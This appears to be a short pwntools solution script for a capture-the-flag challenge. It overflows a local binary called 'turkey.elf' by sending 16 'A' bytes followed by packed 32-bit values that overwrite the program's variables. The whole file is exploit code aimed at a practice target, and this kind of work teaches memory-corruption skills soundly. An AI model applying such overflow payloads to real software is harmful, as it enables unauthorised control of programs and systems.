from pwn import *

o = "A"
v6 = p32(0x1337)
v5 = p32(0xFFFFFFEA)
v4 = p32(0x13)
v3 = p32(0x667463)
v2 = p32(0x2A)

con = process('./turkey.elf')
con.recv()
con.sendline(o * 16 + v2 + v4 + v3 + v5 + v6)
try:
    print("DONE!! ") 
    print(con.recv().decode())
except EOFError:
    print("Error")
con.close()